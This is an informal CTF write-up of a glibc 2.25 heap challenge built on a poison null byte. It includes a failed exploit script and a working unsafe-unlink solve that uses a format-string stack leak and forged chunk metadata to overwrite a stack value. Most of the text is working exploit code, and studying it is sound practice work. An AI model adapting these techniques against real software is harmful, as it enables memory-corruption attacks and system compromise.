Alright so I started this challenge after the CTF was over. I saw that this was a heap challenge and decided that I needed more practice with the heap so I was like why not. 

The program is actually just a poison null byte challenge on glibc 2.25 so there are quite a bit of exploits I could do here. Also we don't need a shell, just overwrite a value in the stack to become `0xcafebabe`. When I first started I thought to myself to do the google poison null byte technique and then when unlinking I would be able to write the stack address (since there is a printf leak) to the array with all of the chunk pointers and then call the `edit()` function with it.

Sadly, this did not work well since when I tried to unlink it would just write the `main_arena` address into the chunk pointers array instead. I tried to go around this for quite a while but no cigar. I then rewatched the HeapLab unsafe unlinking video and thought to myself "oh, this is so much simpler than I thought" and recided to restart the script. Anyways here is the failed attempt:

Edit: also the binary uses `strcpy()` for the `edit()` function. This is why there are for loops and whatnot.
```python
# google poison null byte
create(io, 0x18) # 0
create(io, 0x208) # 1
create(io, 0x88) # 2 
create(io, 0x18) # 3 (stops top chunk consolidation)
    
delete(io, 1)
edit(io, 0, b"A"*0x20) # poison null byte

# remaindered chunks
create(io, 0xf8) # 4
create(io, 0xf8) # 5
     
# create consolidation + overlap
strings_arr_target = 0x204dd0
    
# program uses strcpy lol
# overwrite fd and bk
edit(io, 4, b"A"*10 + p64(strings_arr_target))
edit(io, 4, b"A"*9 + p64(strings_arr_target))
edit(io, 4, b"A"*8 + p64(strings_arr_target))
edit(io, 4, b"AAAA" + p64(strings_arr_target + 8))
edit(io, 4, b"AAA" + p64(strings_arr_target + 8))
edit(io, 4, b"AA" + p64(strings_arr_target + 8))
edit(io, 4, b"A" + p64(strings_arr_target + 8))
edit(io, 4, p64(strings_arr_target + 8))

delete(io, 2)
    
     
# set pointers to a chunk that is in use
create(io, 0xf8) # 6

# chunk 5 has control over fd and bk pointers now
# stack leak at $15%p - (0xd918 - 0xd828)
edit(io, 0, b"%15$p")
target = int(view(io, 0), 16) - (0xd918 - 0xd828)
main_arena = int.from_bytes(view(io, 5)[:-6], "little")
strings_arr_target = 0x204dd0

# program uses strcpy lol
# overwrite fd and bk
edit(io, 5, b"A"*10 + p64(strings_arr_target - 8))
edit(io, 5, b"A"*9 + p64(strings_arr_target - 8))
edit(io, 5, b"A"*8 + p64(strings_arr_target - 8))
edit(io, 5, b"AAAA" + p64(strings_arr_target + 8))
edit(io, 5, b"AAA" + p64(strings_arr_target + 8))
edit(io, 5, b"AA" + p64(strings_arr_target + 8))
edit(io, 5, b"A" + p64(strings_arr_target + 8))
edit(io, 5, p64(strings_arr_target + 8))

create(io, 0x198) # 7
```

And here is the actual solution. After I realised what I could of done I thugged it out in legit 30-45 min. It's literally as shrimple as that.

```python
# unsafe unlink (it is literally that shrimple)
create(io, 0x38) # 0
create(io, 0xf8) # 1
create(io, 0x18) # 2 stops top chunk consolidation

# stack leak at $15%p - (0xd918 - 0xd828)
edit(io, 0, b"%15$p")
key = int(view(io, 0), 16) - (0xd918 - 0xd828)
    
# change prev_inuse flag
edit(io, 0, b"A" * 0x40)
    
# fake prev_size
for i in range(7):
    edit(io, 0, b"A"*(0x36 - i) + b"\x30\x00")

# create fake fd and bk
target = 0x204db0
for i in range(5):
    edit(io, 0, b"A"*(0x1c - i) + p64(target))

for i in range(5):
    edit(io, 0, b"A"*(0x14 - i) + p64(target - 8))
    
# fake size field
for i in range(7):
    edit(io, 0, b"A"*(0xe - i) + b"\x30\x00")

# consolidate
delete(io, 1)

# write key to strings and edit it
edit(io, 0, b"A"*0x18 + p64(key))
edit(io, 0, p64(0xcafebabe))

# get flag
sl(io, b"5")
```

It was literally so shrimple. I really gotta stop overthinking these challenges man. Heap practice makes perfect though plus I reinforced a lot of different heap techniques.

Challenge binary and solve script are in the `bin` directory.

+rep????
